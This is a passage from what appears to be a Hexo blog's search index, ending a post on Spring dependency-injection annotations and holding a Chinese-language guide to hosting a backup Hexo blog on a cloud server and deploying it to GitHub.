class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Primary</span></span><br><span class="line"><span class="meta">@Qualifier</span></span><br><span class="line"><span class="meta">@Resource</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Primary</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpServiceA</span> <span class="keyword">implements</span> <span class="title class_">EmpService</span> &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpController</span> &#123;</span><br><span class="line"><span class="meta">@Resource(name = &quot;empServiceB&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> EmpService empService ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpController</span> &#123;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(&quot;empServiceA&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> EmpService empService ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Development </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云服务器搭建我的备份gitblog</title>
      <link href="/2024/03/30/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84%E5%A4%87%E4%BB%BDgitblog/"/>
      <url>/2024/03/30/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84%E5%A4%87%E4%BB%BDgitblog/</url>
      
        <content type="html"><![CDATA[<p>在经历过一次虚拟机down掉然后重装系统，结果虚拟机无法恢复的折腾之后，我的本地笔记又又又丢了，于是打算把blog的环境给放到云上，实现redundancy</p><h1 id="环境搭建及测试"><a href="#环境搭建及测试" class="headerlink" title="环境搭建及测试"></a>环境搭建及测试</h1><p>首先安装git和nodejs环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yum install git -y</span><br><span class="line">yum install -y nodejs</span><br><span class="line">npm install -g cnpm</span><br><span class="line">npm install -g hexo-cli</span><br><span class="line">mkdir blog</span><br><span class="line">cd blog</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>测试，这里的IP是服务器的内网IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s -i 172.20.255.46 -p 80</span><br></pre></td></tr></table></figure><p>然后就可以通过公网IP访问了</p><h1 id="安装cactus主题"><a href="#安装cactus主题" class="headerlink" title="安装cactus主题"></a>安装cactus主题</h1><p>进入博客所在目录然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/probberechts/hexo-theme-cactus.git themes/cactus</span><br></pre></td></tr></table></figure><p>然后在.&#x2F;_config.yml中修改theme</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: cactus</span><br></pre></td></tr></table></figure><h2 id="添加about页面"><a href="#添加about页面" class="headerlink" title="添加about页面"></a>添加about页面</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;about&quot;</span><br></pre></td></tr></table></figure><p>会在根目录的source文件夹下新建about&#x2F;index.md</p><h2 id="在导航栏添加搜索功能"><a href="#在导航栏添加搜索功能" class="headerlink" title="在导航栏添加搜索功能"></a>在导航栏添加搜索功能</h2><p>在.&#x2F;themes&#x2F;cactus&#x2F;_config.yml中找到nav 新建search标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nav:</span><br><span class="line">  search: /search/</span><br></pre></td></tr></table></figure><p>执行npm install hexo-generator-search –save</p><p>执行hexo new page search</p><p>进入.&#x2F;themes&#x2F;cactus&#x2F;source&#x2F;serch&#x2F;index.md，修改md文件的头为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: Search</span><br><span class="line">type: search</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>更新之后进入网站，点击search就可以搜索了</p><h2 id="标签功能"><a href="#标签功能" class="headerlink" title="标签功能"></a>标签功能</h2><p>在主题的配置文件中添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nav:</span><br><span class="line">  home: /</span><br><span class="line">  about: /about/</span><br><span class="line">  articles: /archives/</span><br><span class="line">  tags: /tags/</span><br><span class="line">  projects: http://github.com/yu1e</span><br><span class="line">  search: /search/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">title: Tags and Categories</span><br><span class="line">date: 2017-12-24 23:29:53</span><br><span class="line">tags:</span><br><span class="line">- Foo</span><br><span class="line">- Bar</span><br></pre></td></tr></table></figure><p>然后hexo new page “tags”</p><p>在tags目录下新生成的index.md中添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: tags</span><br><span class="line">date: 2024-03-31 13:59:52</span><br><span class="line">type: tags</span><br></pre></td></tr></table></figure><h1 id="更新到github"><a href="#更新到github" class="headerlink" title="更新到github"></a>更新到github</h1><p>首先生成密钥和配置用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;xxx@mail.com&quot;</span><br><span class="line">cat /root/.ssh/id_rsa.pub</span><br><span class="line">git config --global user.name &quot;xxx&quot;</span><br><span class="line">git config --global user.email &quot;xxx&quot;</span><br></pre></td></tr></table></figure><p>然后把公钥内容放到GitHub上，再新建一个仓库，这个就不说了，很简单</p><p>测试连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>然后改配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://github.com/godweiyang/godweiyang.github.io</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>更新</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Tips </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
